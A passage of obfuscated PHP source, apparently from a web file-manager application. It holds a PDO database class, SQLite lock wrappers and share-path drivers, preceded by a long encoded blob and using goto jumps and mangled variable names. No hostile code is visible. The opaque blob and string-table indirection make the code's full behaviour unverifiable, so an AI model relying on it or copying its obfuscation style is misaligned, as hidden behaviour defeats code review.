1\36\56\154\35\251\233\355\262\135\145\145\56\325\60\143\326\74\131\316\42\246\120\334\33\263\347\157\350\17\260\111\2\51\24\47\32\52\314\267\267\114".base64_decode('Pkii056n/MVr17bxP1sw4vxCQSUdYl5epUcuJTyVlNhcOkcmVgOypKXmLJHyGRVaK22JYkk=')."\320\27\212\315\54\76\324\347\360\15\202\135\324\234\7\327\112\347\63\322\137\166\30\304\102\140\21\162\152\155\201\370\106\44\113\7\70\271\104\333\164\313\236\160\166\274\145\22\71\152\64\237\205"."\35\35\173\342\20\153\252\302\40\174\316\64\261\263\30\75\266\11\165\65\334\175\207\130\316\71\12\376\305\214\230\124\170\205\132\322\300\371\234\76\120\226\220\237\101\275\232\355\225\120\120\222\135"."\352\166\224\314\56\20\5\161\124\166\366\333\125\74\312\46\312\350\365\50\23\1\225\131\277\312\217\125\13\37\220\22\17\210\163\63\113\371\11\44\15\304\120\333\311\115\311\17\342\22\53\147\341"."\302\210\54\120\307\142\225\134\342\313\126\302\244\40\171\25\224\27\55\75\57\54\104\122\104\206\5\75\202\45\114\124\62\110\63\3\113\270\215\271\46\351\36\72\345\144\314\41\12\137\44\170\354".base64_decode('pZfnTflberYaUf4oM+BAzXGcd1FYOIGXqFTKFcnGjJAG8cY6YYqnATssezJwnLD4+6uOE5c=')."\345\176\204\31\361\217\216\207\151\122\145\117\336\3\261\44\366\172\264\66\151\273\25\73\253\370\352\50\345\104\100\222\75\223\143\32\117\164\70\174\300\176\17\135\24\203\271\221\260\134\317\272\123"."\227\356\364\233\235\37\376\327\357\17\377\277\172\166\170\126\35\273\45\340\326\176\270\42\156\136\270\4\330\171\150\66\276\250\345\262\22\52\252\166\165\310\271\267\116\2\344\102\263\340\33\24\264"."\206\204\271\166\73\163\202\311\174\143\152\354\36\117\313\146\245\35\270\362\1\250\354\201\171\204\223\3\374\105\361\112\1\267\131\262\373\261\371\156\42\51\146\257\305\367\12\362\202\343\52\145\223".strrev('1ΦΈ„β>hN,H:~TO›p¨‘ΌΌΠ]0=U†¤¶λ|½€™\\)R1BΚOO=v¨')."\373\112\342\223\52\161\267\3\323\40\273\104\210\26\330\231\266\26\166\231\336\305\214\32\22\67\54\100\24\145\102\350\210\52\43\237\11\307\344\72\42\345\171\23\64\316\347\364\377\4\71\332\135".base64_decode('L2hTIEseW8ddRblyR3luTlnkLNgKwSmjw9NKDjd1XldEvddVHH9E3LloHK9aU4UYtNJiWBY=').base64_decode('w2Ry5LqLXIZ7y/PQBRIXMBMs0coUgzdKyCXxlzwejPJ0Fk3CbjpjuXxKUv5OSsJfNwdJo6c=')."\xfa\xca\x76\x45\x46\x84\x1d\x33\x85\x35\xc\xc5\x35\x6b\x22\x1a\xb\xa9\xcb\xc3\xd8\x7d\x47\xf8\xf4\x50\x17\x73\x4e\x6d\x98\xe4\x3d\x19\x56\x64\x57\x7b\xd\x31\xcd\x83\x5\x80\xce\x42\xad\xa6\x40\x25\x1d\x91\x47"."\x49\x12\x2d\x3c\x2c\xdb\xb9\x42\x90\x5f\xa\x3b\xed\xb7\x25\xbb\xf\xe6\xca\x4c\x96\x8d\x3a\x81\xb1\x2d\x8f\x73\x2d\x2e\xac\x4\x96\x34\x8b\x96\xec\x9e\xd4\x91\x88\xd9\x3a\x13\xa5\xc6\xd8\x71\xbe\x9f\xa9\x72\x74".base64_decode('5dGK1pO2nlIwp+A4InTPrJvR+3nFoXQOOfMLIOGsEp/hZVrJDKZiPpM6HaqUhpA0bjuwSbw=').base64_decode('W+R+r8j5PlGjJLSlTz85HjYrm6QOMyh4GFcaphETp+LDLr8CZy/VYC0/P/Z8hi1U/AQRQdY=')."\276\122\315\251\114\301\11\213\30\204\244\211\220\336\362\43\46\324\144\27\107\242\305\130\256\243\314\137\240\323\10\115\312\117\344\117\124\244\344\220\54\201\122\203\34\45\135\362\243\323\135\312\371"."\206\35\111\44\321\314\141\72\224\40\135\123\73\265\4\270\175\157\331\236\133\62\42\122\62\311\305\34\357\242\137\354\211\40\54\74\123\221\144\172\357\26\30\324\270\363\67\167\256\56\307\311\131".strrev('.KΦΒPpΕΌνέ) '."\n".'ΑµZ¥L,qrΨ(6£Ϋρρ\\&`·£α²Λ#Ω·6Ώ*bH)').base64_decode('RIQ9kT4k1w5wwn7HAVgeK1yMSPnFvaHoJo6r1H1CDJ3ZZRcmHKlEFH3JiyvgSEdwrKEkNHM=').base64_decode('aFe4PElU6XSYwsH4nCEYYnHodcS6pAhYdMd4T1cSCLOk4ivKvCQU0LMRqThZjWDCDPHKlQg=')."\254\164\16\261\344\151\106\44\60\356\306\164\14\276\264\275\361\216\1\144\114\116\164\64\247\2\152\260\343\210\103\147\244\54\321\314\146\361\305\360\4\311\124\255\130\332\214\313\41\204\244\226\66".base64_decode('iJy+xcKhkTlyzUHTAs4kCq+7xk3O4B5TmsPxcKYcP2TYyYwkKihPLI8vlk0zNKByP9ytZbM=').base64_decode('7BagiELK2iNpRyXMCnloiypmo0k4pziKOfJOMAQ4L03CecuSWeaycSX5bK1kTdC98sEDgVw=').strrev('c°―x()JοΒ‚Πά+a<¨­J”ε.o![•x$M'."\r".'ΐkW—+<hJΨ…‡B').base64_decode('sJQKewSlfxNqewkNqPLNSqRV0MeiVWLOTPbPWSFZVu6qrP4Vq0jfLKdeliteHiDwPU8DTH8=').strrev('ΫYO%ΚΗKΉΆΏοδ’ωϊ‰Ν+.qξΥΜg]	Lc|›Θ”¬M©ϋ2½θ@cY‡±')."\127\12\325\100\172\260\67\155\43\251\73\37\25\220\275\4\322\164\126\111\126\222\270\273\304\340\102\126\347\120\27\252\40\34\46\121\364\323\47\356\235\150\171\22\133\46\160\302\141\131\107\231\41"."\270\344\243\312\2\101\174\223\307\57\206\211\277\173\312\74\320\344\270\131\264\75\70\55\141\26\310\157\263\151\333\102\367\206\212\303\310\21\0\163\0\36\111\265\14\175\211\33\141\334\50\162\277"."\x48\xd0\x96\x50\x2c\xf2\x9\x6a\xb\x58\xbc\x14\xd7\x69\x2a\xa1\x73\x8e\x0\xbe\xb7\xe4\x1\x79\x83\x87\x5b\xc9\xd6\x92\x4b\xc1\x42\x44\xc\x98\xa9\x3e\x73\x98\xf9\xc6\x44\x78\x25\xd\x92\xb8\xa3\xd4\xdc\x5c\xed"."\240\333\362\133\126\224\43\116\137\54\77\115\361\303\13\126\136\122\6\274\357\353\133\135\110\73\262\323\207\110\271\272\373\347\225\0\67\30\242\10\372\174\15\21\47\203\345\137\74\21\57\113\352"."\xc\xc4\xe3\xcb\xa3\xb1\x16\xfa\xda\x4d\x59\x32\xc9\x25\x69\x20\x96\x25\x75\xb6\x45\x3b\x26\x4a\xb\xb5\x7\xc2\x91\xb2\x34\xac\xac\xd8\xa1\xa\x2f\xab\x34\x29\xdc\x49\x5a\x49\xee\xe9\x27\x6a\x45\x38\xb8\x54\xb4".base64_decode('hF0CRuAdVTEL0qVYIWOyuy4GH9eyTD4lXafoOeF0V+Rxit3k2baYd2z+4XxQ0qUp7FRoYUg=')."\15\305\142\35\304\16\250\51\126\200\130\374\102\20\247\15\374\164\41\124\137\174\16\255\32\51\236\254\37\102\220\44\274\224\367\172\162\151\312\245\161\44\171\132\305\301\223\257\136\312\57\377\110"."\xaa\x18\x1c\xdc\xcc\x53\x4d\xd0\x6b\x5d\x6d\xf6\x89\x3\x1d\x9c\xf4\xc0\xbe\x1f\x86\x5b\xd2\x3a\xa5\xdf\x8e\x64\x5b\x4b\x33\x61\xa9\x43\x87\x84\xca\xd0\x31\xbd\x10\xd2\xed\xff\x3\x3f\x46\xdd\x93\x39\xbc\x0\x0"."".""."".strrev('')."", 10, -8))); goto Eι²άβ –; BΌΠΧνΚ›: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Εγκύ¬ = '') { $πσΪΊ  =& $_SERVER[γγάψ½]; if (!class_exists($πσΪΊ [1000])) { think_exception(think_lang($πσΪΊ [14]) . $πσΪΊ [1001]); } if (!empty($Εγκύ¬)) { $this->config = $Εγκύ¬; if (empty($this->config[$πσΪΊ [17]])) { $this->config[$πσΪΊ [17]] = array(); } } } public function connect($–Μ…¥Η… = '', $¤™ϊ’λ² = 0) { $Β„ύ€ΪΗ =& $_SERVER[γγάψ½]; if (!isset($this->linkID[$¤™ϊ’λ²])) { if (empty($–Μ…¥Η…)) { $–Μ…¥Η… = $this->config; } $πΦΠυ› = !empty($–Μ…¥Η…[$Β„ύ€ΪΗ[17]][$Β„ύ€ΪΗ[18]]) ? $–Μ…¥Η…[$Β„ύ€ΪΗ[17]][$Β„ύ€ΪΗ[18]] : $this->pconnect; if ($πΦΠυ›) { $–Μ…¥Η…[$Β„ύ€ΪΗ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¤™ϊ’λ²] = new PDO($–Μ…¥Η…[$Β„ύ€ΪΗ[1002]], $–Μ…¥Η…[$Β„ύ€ΪΗ[974]], $–Μ…¥Η…[$Β„ύ€ΪΗ[975]], $–Μ…¥Η…[$Β„ύ€ΪΗ[17]]); } catch (PDOException $γ§–νχ) { think_exception($γ§–νχ->getMessage()); } $this->dbType = $this->_getDsnType($–Μ…¥Η…[$Β„ύ€ΪΗ[1002]]); if (in_array($this->dbType, array($Β„ύ€ΪΗ[1003], $Β„ύ€ΪΗ[1004], $Β„ύ€ΪΗ[1005], $Β„ύ€ΪΗ[1006]))) { think_exception($Β„ύ€ΪΗ[1007] . $this->dbType . $Β„ύ€ΪΗ[1008] . $this->dbType . $Β„ύ€ΪΗ[1009]); } if (!$this->linkID[$¤™ϊ’λ²]) { think_exception($Β„ύ€ΪΗ[1010]); } try { $this->linkID[$¤™ϊ’λ²]->exec($Β„ύ€ΪΗ[1011] . think_config($Β„ύ€ΪΗ[977])); } catch (Exception $γ§–νχ) { } $this->connected = !0; if (1 != think_config($Β„ύ€ΪΗ[22])) { unset($this->config); } } return $this->linkID[$¤™ϊ’λ²]; } public function free() { $this->PDOStatement = null; } public function query($ϊω―ρ§‡, $κ‡Ν° = array()) { $§ε’ΙΥλ =& $_SERVER[γγάψ½]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ϊω―ρ§‡; if (!empty($κ‡Ν°)) { $this->queryStr .= $§ε’ΙΥλ[1012] . print_r($κ‡Ν°, !0) . $§ε’ΙΥλ[1013]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($§ε’ΙΥλ[23], 1); think_status($§ε’ΙΥλ[24]); $this->PDOStatement = $this->_linkID->prepare($ϊω―ρ§‡); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ „Έ–τΘ = $this->PDOStatement->execute($κ‡Ν°); $this->debug(); if (!1 === $ „Έ–τΘ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($όΞω, $ρ‘τρ€ο = array()) { $έΤ­€Ι± =& $_SERVER[γγάψ½]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $όΞω; if (!empty($ρ‘τρ€ο)) { $this->queryStr .= $έΤ­€Ι±[1012] . print_r($ρ‘τρ€ο, !0) . $έΤ­€Ι±[1013]; } $£υ”ύή = !1; if ($this->dbType == $έΤ­€Ι±[1006]) { if (preg_match($έΤ­€Ι±[1014], $this->queryStr, $υιµΠΚέ)) { $this->table = think_config($έΤ­€Ι±[1015]) . str_ireplace(think_config($έΤ­€Ι±[1016]), $έΤ­€Ι±[457], $υιµΠΚέ[2]); $£υ”ύή = (bool) $this->query($έΤ­€Ι±[1017] . strtoupper($this->table) . $έΤ­€Ι±[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($έΤ­€Ι±[25], 1); think_status($έΤ­€Ι±[24]); $this->PDOStatement = $this->_linkID->prepare($όΞω); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $°µν›κ = $this->PDOStatement->execute($ρ‘τρ€ο); $this->debug(); if (!1 === $°µν›κ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($£υ”ύή || preg_match($έΤ­€Ι±[1018], $όΞω)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ΣΪζΆφ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ΣΪζΆφ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ΙόδϋΝ¦ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ΙόδϋΝ¦) { $this->error(); return !1; } } return !0; } private function getAll() { $Ε‚£Γύω = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ε‚£Γύω); return $Ε‚£Γύω; } public function getFields($µλ‚Ώυρ) { $ ΫΤτΪί =& $_SERVER[γγάψ½]; $this->initConnect(!0); if (think_config($ ΫΤτΪί[1019])) { $ζΥ„„Ν = str_replace($ ΫΤτΪί[1020], $µλ‚Ώυρ, think_config($ ΫΤτΪί[1019])); } else { switch ($this->dbType) { case $ ΫΤτΪί[1003]: case $ ΫΤτΪί[1021]: $ζΥ„„Ν = "\x53\105\114\105\103\124\40\x20\40\x63\157\x6c\x75\x6d\x6e\x5f\156\141\x6d\x65\40\141\163\40\47\116\x61\x6d\x65\x27\x2c\40\x20\x20\144\x61\164\x61\x5f\x74\171\160\145\40\x61\x73\40\x27\x54\x79\x70\x65\47\54\40\40\40\x63\x6f\x6c\165\155\x6e\137\x64\145\146\141\x75\x6c\164\x20\x61\x73\40\47\104\145\146\141\x75\x6c\x74\47\x2c\40\40\40\x69\163\137\156\x75\154\154\x61\x62\154\x65\x20\x61\163\x20\x27\116\x75\154\x6c\x27\12\x9\x9\x46\122\x4f\115\x9\x69\x6e\146\x6f\x72\155\x61\x74\x69\157\156\x5f\163\x63\x68\145\155\x61\x2e\164\x61\x62\154\145\x73\x20\101\123\x20\x74\xa\11\x9\112\117\111\x4e\11\x69\x6e\x66\157\162\x6d\x61\164\x69\x6f\x6e\137\163\143\x68\x65\x6d\x61\56\143\157\154\165\x6d\156\x73\40\101\123\x20\143\xa\x9\x9\x4f\116\40\x20\164\56\164\141\x62\154\x65\137\143\141\x74\x61\154\x6f\147\x20\75\40\143\x2e\164\141\x62\154\145\137\x63\x61\164\x61\154\x6f\147\12\x9\11\101\116\104\40\164\x2e\x74\x61\142\x6c\145\137\163\x63\x68\145\155\x61\40\75\x20\x63\x2e\164\x61\x62\x6c\x65\x5f\163\x63\150\145\155\x61\xa\11\x9\101\116\x44\x20\164\56\164\141\x62\x6c\x65\137\x6e\x61\155\145\40\75\x20\143\56\x74\141\x62\154\x65\137\x6e\141\x6d\145\xa\x9\11\127\110\x45\122\105\40\40\40\164\56\164\x61\x62\154\x65\x5f\156\x61\x6d\145\40\x3d\x20\x27{$µλ‚Ώυρ}\47"; break; case $ ΫΤτΪί[1022]: $ζΥ„„Ν = $ ΫΤτΪί[1023] . $µλ‚Ώυρ . $ ΫΤτΪί[1024]; break; case $ ΫΤτΪί[1004]: case $ ΫΤτΪί[1006]: $ζΥ„„Ν = $ ΫΤτΪί[1025] . $ ΫΤτΪί[1026] . $ ΫΤτΪί[1027] . strtoupper($µλ‚Ώυρ) . $ ΫΤτΪί[1028] . strtoupper($µλ‚Ώυρ) . $ ΫΤτΪί[1029]; break; case $ ΫΤτΪί[1030]: $ζΥ„„Ν = $ ΫΤτΪί[1031] . $µλ‚Ώυρ . $ ΫΤτΪί[1032]; break; case $ ΫΤτΪί[1005]: break; case $ ΫΤτΪί[1033]: default: $ζΥ„„Ν = $ ΫΤτΪί[1034] . ($this->dbType == $ ΫΤτΪί[1033] ? "\x60{$µλ‚Ώυρ}\140" : $µλ‚Ώυρ); } } $ΛΥ…Ο²β = $this->query($ζΥ„„Ν); $Ό«”ƒΝ = array(); if ($ΛΥ…Ο²β) { foreach ($ΛΥ…Ο²β as $ώη…€Λ => $Μγΰ•ο¤) { $Μγΰ•ο¤ = array_change_key_case($Μγΰ•ο¤); $Μγΰ•ο¤[$ ΫΤτΪί[32]] = isset($Μγΰ•ο¤[$ ΫΤτΪί[32]]) ? $Μγΰ•ο¤[$ ΫΤτΪί[32]] : $ ΫΤτΪί[457]; $Μγΰ•ο¤[$ ΫΤτΪί[33]] = isset($Μγΰ•ο¤[$ ΫΤτΪί[33]]) ? $Μγΰ•ο¤[$ ΫΤτΪί[33]] : $ ΫΤτΪί[457]; $ω›‚‘ = isset($Μγΰ•ο¤[$ ΫΤτΪί[353]]) ? $Μγΰ•ο¤[$ ΫΤτΪί[353]] : $Μγΰ•ο¤[$ ΫΤτΪί[32]]; $Ό«”ƒΝ[$ω›‚‘] = array($ ΫΤτΪί[32] => $ω›‚‘, $ ΫΤτΪί[33] => $Μγΰ•ο¤[$ ΫΤτΪί[33]], $ ΫΤτΪί[35] => (bool) (isset($Μγΰ•ο¤[$ ΫΤτΪί[106]]) && $Μγΰ•ο¤[$ ΫΤτΪί[106]] === $ ΫΤτΪί[12] || isset($Μγΰ•ο¤[$ ΫΤτΪί[35]]) && $Μγΰ•ο¤[$ ΫΤτΪί[35]] === $ ΫΤτΪί[12]), $ ΫΤτΪί[37] => isset($Μγΰ•ο¤[$ ΫΤτΪί[37]]) ? $Μγΰ•ο¤[$ ΫΤτΪί[37]] : (isset($Μγΰ•ο¤[$ ΫΤτΪί[56]]) ? $Μγΰ•ο¤[$ ΫΤτΪί[56]] : $ ΫΤτΪί[457]), $ ΫΤτΪί[39] => isset($Μγΰ•ο¤[$ ΫΤτΪί[97]]) ? strtolower($Μγΰ•ο¤[$ ΫΤτΪί[97]]) == $ ΫΤτΪί[41] : (isset($Μγΰ•ο¤[$ ΫΤτΪί[57]]) ? $Μγΰ•ο¤[$ ΫΤτΪί[57]] : !1), $ ΫΤτΪί[42] => isset($Μγΰ•ο¤[$ ΫΤτΪί[1035]]) ? strtolower($Μγΰ•ο¤[$ ΫΤτΪί[1035]]) == $ ΫΤτΪί[44] : (isset($Μγΰ•ο¤[$ ΫΤτΪί[97]]) ? $Μγΰ•ο¤[$ ΫΤτΪί[97]] : !1)); } } return $Ό«”ƒΝ; } public function getTables($ι…¦§ΎΌ = '') { $΅ΊΜΥΉ¥ =& $_SERVER[γγάψ½]; if (think_config($΅ΊΜΥΉ¥[1036])) { $‘ήΫψσ = str_replace($΅ΊΜΥΉ¥[1037], $ι…¦§ΎΌ, think_config($΅ΊΜΥΉ¥[1036])); } else { switch ($this->dbType) { case $΅ΊΜΥΉ¥[1004]: case $΅ΊΜΥΉ¥[1006]: $‘ήΫψσ = $΅ΊΜΥΉ¥[1038]; break; case $΅ΊΜΥΉ¥[1003]: case $΅ΊΜΥΉ¥[1021]: $‘ήΫψσ = $΅ΊΜΥΉ¥[1039]; break; case $΅ΊΜΥΉ¥[1030]: $‘ήΫψσ = $΅ΊΜΥΉ¥[1040]; break; case $΅ΊΜΥΉ¥[1005]: think_exception(think_lang($΅ΊΜΥΉ¥[1041]) . $΅ΊΜΥΉ¥[1042]); break; case $΅ΊΜΥΉ¥[1022]: $‘ήΫψσ = $΅ΊΜΥΉ¥[45] . $΅ΊΜΥΉ¥[46] . $΅ΊΜΥΉ¥[47]; break; case $΅ΊΜΥΉ¥[1033]: default: if (!empty($ι…¦§ΎΌ)) { $‘ήΫψσ = $΅ΊΜΥΉ¥[985] . $ι…¦§ΎΌ . $΅ΊΜΥΉ¥[986]; } else { $‘ήΫψσ = $΅ΊΜΥΉ¥[987]; } } } $§ηςΡφ = $this->query($‘ήΫψσ); $©Ξδ“–τ = array(); foreach ($§ηςΡφ as $Ω›»¶ψΐ => $Ζ•α…γ¦) { $©Ξδ“–τ[$Ω›»¶ψΐ] = current($Ζ•α…γ¦); } return $©Ξδ“–τ; } protected function parseLimit($χ½ψ‘Ά) { $¬ΩΈλ”ζ =& $_SERVER[γγάψ½]; $§ιρο = $¬ΩΈλ”ζ[12]; if (!empty($χ½ψ‘Ά)) { switch ($this->dbType) { case $¬ΩΈλ”ζ[1030]: case $¬ΩΈλ”ζ[1022]: $χ½ψ‘Ά = explode($¬ΩΈλ”ζ[50], $χ½ψ‘Ά); if (count($χ½ψ‘Ά) > 1) { $§ιρο .= $¬ΩΈλ”ζ[51] . $χ½ψ‘Ά[1] . $¬ΩΈλ”ζ[52] . $χ½ψ‘Ά[0] . $¬ΩΈλ”ζ[53]; } else { $§ιρο .= $¬ΩΈλ”ζ[51] . $χ½ψ‘Ά[0] . $¬ΩΈλ”ζ[53]; } break; case $¬ΩΈλ”ζ[1003]: case $¬ΩΈλ”ζ[1021]: break; case $¬ΩΈλ”ζ[1005]: break; case $¬ΩΈλ”ζ[1004]: case $¬ΩΈλ”ζ[1006]: break; case $¬ΩΈλ”ζ[1033]: default: $§ιρο .= $¬ΩΈλ”ζ[51] . $χ½ψ‘Ά . $¬ΩΈλ”ζ[53]; } } return $§ιρο; } public function parseKey(&$Π²Θ΄ψΣ, $ †€κ–€ = true) { $δ³Ύ³›™ =& $_SERVER[γγάψ½]; if ($ †€κ–€) { $Π²Θ΄ψΣ = $this->parseKeyCheck($Π²Θ΄ψΣ); } if ($this->dbType == $δ³Ύ³›™[1033]) { if ($Π²Θ΄ψΣ != $δ³Ύ³›™[223] && !preg_match($δ³Ύ³›™[997], $Π²Θ΄ψΣ)) { $Π²Θ΄ψΣ = $δ³Ύ³›™[464] . trim($Π²Θ΄ψΣ, $δ³Ύ³›™[464]) . $δ³Ύ³›™[464]; } return $Π²Θ΄ψΣ; } else { return parent::parseKey($Π²Θ΄ψΣ, $ †€κ–€); } } public function close() { $this->_linkID = null; } public function error() { $ίΤ΄°¨ =& $_SERVER[γγάψ½]; if ($this->PDOStatement) { $ΉΨ¨Β‡© = $this->PDOStatement->errorInfo(); $this->error = $ΉΨ¨Β‡©[1] . $ίΤ΄°¨[4] . $ΉΨ¨Β‡©[2]; } else { $this->error = $ίΤ΄°¨[12]; } if ($ίΤ΄°¨[12] != $this->queryStr) { $this->error .= LNG($ίΤ΄°¨[48]) . $this->queryStr; } think_trace($this->error, $ίΤ΄°¨[12], $ίΤ΄°¨[49]); return $this->error; } public function escapeString($Υ΄ι ©Ϋ) { $„Ύ”κ΅ =& $_SERVER[γγάψ½]; switch ($this->dbType) { case $„Ύ”κ΅[1030]: case $„Ύ”κ΅[1003]: case $„Ύ”κ΅[1021]: case $„Ύ”κ΅[1033]: return addslashes($Υ΄ι ©Ϋ); case $„Ύ”κ΅[1005]: case $„Ύ”κ΅[1022]: case $„Ύ”κ΅[1004]: case $„Ύ”κ΅[1006]: return str_ireplace($„Ύ”κ΅[58], $„Ύ”κ΅[59], $Υ΄ι ©Ϋ); } } protected function parseValue($ζ™ΰβΎ) { $Ψ €Η§ =& $_SERVER[γγάψ½]; if (is_string($ζ™ΰβΎ)) { $ΠΞόΟ = strpos($ζ™ΰβΎ, $Ψ €Η§[4]) === 0 && in_array($ζ™ΰβΎ, array_keys($this->bind)); $ζ™ΰβΎ = $ΠΞόΟ ? $this->escapeString($ζ™ΰβΎ) : $Ψ €Η§[1043] . $this->escapeString($ζ™ΰβΎ) . $Ψ €Η§[1043]; } elseif (isset($ζ™ΰβΎ[0]) && is_string($ζ™ΰβΎ[0]) && strtolower($ζ™ΰβΎ[0]) == $Ψ €Η§[375]) { $ζ™ΰβΎ = $this->escapeString($ζ™ΰβΎ[1]); } elseif (is_array($ζ™ΰβΎ)) { $ζ™ΰβΎ = array_map(array($this, $Ψ €Η§[1044]), $ζ™ΰβΎ); } elseif (is_bool($ζ™ΰβΎ)) { $ζ™ΰβΎ = $ζ™ΰβΎ ? $Ψ €Η§[91] : $Ψ €Η§[231]; } elseif (is_null($ζ™ΰβΎ)) { $ζ™ΰβΎ = $Ψ €Η§[106]; } return $ζ™ΰβΎ; } public function getLastInsertId() { $όΐ“χθ =& $_SERVER[γγάψ½]; switch ($this->dbType) { case $όΐ“χθ[1030]: case $όΐ“χθ[1022]: case $όΐ“χθ[1003]: case $όΐ“χθ[1021]: case $όΐ“χθ[1005]: case $όΐ“χθ[1033]: return $this->_linkID->lastInsertId(); case $όΐ“χθ[1004]: case $όΐ“χθ[1006]: $™ΉΧΞ = $this->table; $ΒΌύλεθ = $this->query("\123\105\x4c\x45\x43\124\40{$™ΉΧΞ}\56\x63\x75\x72\162\166\141\154\40\x63\165\x72\162\x76\141\x6c\x20\106\x52\117\115\40\x64\x75\x61\154"); return $ΒΌύλεθ ? $ΒΌύλεθ[0][$όΐ“χθ[1045]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($§¦α΄χ) { $Ϊςζμ΅ϊ =& $_SERVER[γγάψ½]; if (!CacheLock::fileLock($Ϊςζμ΅ϊ[13])) { return !1; } $άύΆΖ° = parent::query($§¦α΄χ); CacheLock::fileUnLock($Ϊςζμ΅ϊ[13]); return $άύΆΖ°; } public function execute($Υ‚³‡ΉΪ) { $ΐεΡ½ΑΞ =& $_SERVER[γγάψ½]; if (!CacheLock::fileLock($ΐεΡ½ΑΞ[13])) { return !1; } $Ώ™“™• = parent::execute($Υ‚³‡ΉΪ); CacheLock::fileUnLock($ΐεΡ½ΑΞ[13]); return $Ώ™“™•; } } class DbSqlite3 extends DbSqlite3Base { public function query($ΆΕκΦΰ) { $‡τ‰ΦΊ =& $_SERVER[γγάψ½]; if (!CacheLock::fileLock($‡τ‰ΦΊ[13])) { return !1; } $£΅ύΫ― = parent::query($ΆΕκΦΰ); CacheLock::fileUnLock($‡τ‰ΦΊ[13]); return $£΅ύΫ―; } public function execute($άύώ†«ώ) { $£ΗƒπτΗ =& $_SERVER[γγάψ½]; if (!CacheLock::fileLock($£ΗƒπτΗ[13])) { return !1; } $ό΄®Ϊ³Β = parent::execute($άύώ†«ώ); CacheLock::fileUnLock($£ΗƒπτΗ[13]); return $ό΄®Ϊ³Β; } } goto C•©»έΨΦί; e‡ΪΤ¨ΡΟ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($αΕΜΩμ) { $this->pathParse = $αΕΜΩμ; $this->model = Model($_SERVER[γγάψ½][1439]); } public function getPathOuter($ΐτ…—½) { $ΜΝΤ‰ΡΕ =& $_SERVER[γγάψ½]; if (!$ΐτ…—½) { return $ΐτ…—½; } $τψδΣ‹΄ = $this->parse($ΐτ…—½); return trim(KodIO::makeShare($this->pathParse[$ΜΝΤ‰ΡΕ[478]], $τψδΣ‹΄[$ΜΝΤ‰ΡΕ[478]]), $ΜΝΤ‰ΡΕ[8]); } protected function infoParse($ς°άβΛ, $Υ“‚ΫΏ = false, $ƒ•θΔ = false) { $Αη¥΄ψή =& $_SERVER[γγάψ½]; $γΞηΌώΙ = $this->pathParse[$Αη¥΄ψή[478]]; $ΦΎφόμΝ = trim($this->pathParse[$Αη¥΄ψή[1260]], $Αη¥΄ψή[8]); return Action($Αη¥΄ψή[1446])->sharePathInfo($γΞηΌώΙ, $ΦΎφόμΝ, $Υ“‚ΫΏ); } public function infoFull($αΕ„Μα‹) { $όΗ΄¶ =& $_SERVER[γγάψ½]; $ΣΡ€ίΜ¨ = explode($όΗ΄¶[8], trim($αΕ„Μα‹, $όΗ΄¶[8])); if (count($ΣΡ€ίΜ¨) > 1) { $τ¨—Οό = implode($όΗ΄¶[8], array_splice($ΣΡ€ίΜ¨, 1)); $…ηβΙάω = $this->model->pathInfoByPath($ΣΡ€ίΜ¨[0], $τ¨—Οό); if (!$…ηβΙάω) { return !1; } $this->pathParse[$όΗ΄¶[1260]] = $…ηβΙάω[$όΗ΄¶[194]]; } return $this->infoParse($αΕ„Μα‹); } public function listAll($²΄™Σ•ξ) { $‰‰ρΛ§­ =& $_SERVER[γγάψ½]; $ϊ€Φ”ί = IO::info($this->pathParse[$‰‰ρΛ§­[87]]); if (!$ϊ€Φ”ί) { return array(); } $―Π²ϋ‹ = $this->model->listAll($²΄™Σ•ξ); $ΙΡνύ„ = Model($‰‰ρΛ§­[672])->getInfo($ϊ€Φ”ί[$‰‰ρΛ§­[673]]); foreach ($―Π²ϋ‹ as &$¥Πϋρ†Ί) { check_abort(); $¥Πϋρ†Ί[$‰‰ρΛ§­[90]] = Action($‰‰ρΛ§­[1446])->_shareItemeParse($¥Πϋρ†Ί[$‰‰ρΛ§­[90]], $ΙΡνύ„); } unset($¥Πϋρ†Ί); return $―Π²ϋ‹; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($φ™Ας—) { $this->pathParse = $φ™Ας—; $this->model = Model($_SERVER[γγάψ½][1439]); } protected function infoParse($ύγΖ •ύ, $ςΝΜΦε = false, $ϊΗΪΈ‰ = false) { $³Αό =& $_SERVER[γγάψ½]; return Action($³Αό[1267])->sharePathInfo($this->pathParse[$³Αό[87]], !0, $ςΝΜΦε); } public function listPath($ΕόΘθΊΈ, $£άρΊ”κ = false) { $ΨΕ±‰ϋΖ =& $_SERVER[γγάψ½]; $Σ‡ΚηΟθ = parent::listPath($ΕόΘθΊΈ, $£άρΊ”κ); if (!$Σ‡ΚηΟθ) { return $Σ‡ΚηΟθ; } if (is_array($Σ‡ΚηΟθ[$ΨΕ±‰ϋΖ[1447]])) { $Σ‡ΚηΟθ[$ΨΕ±‰ϋΖ[1447]] = Action($ΨΕ±‰ϋΖ[1267])->shareItemInfo($Σ‡ΚηΟθ[$ΨΕ±‰ϋΖ[1447]]); } foreach ($Σ‡ΚηΟθ as $ΌΏ•³ΏΑ => $¬πκ―ΡΏ) { if (!in_array($ΌΏ•³ΏΑ, array($ΨΕ±‰ϋΖ[86], $ΨΕ±‰ϋΖ[85]))) { continue; } foreach ($¬πκ―ΡΏ as $Ρ€Ϊϊ => $΄Ι–ΨΛΊ) { 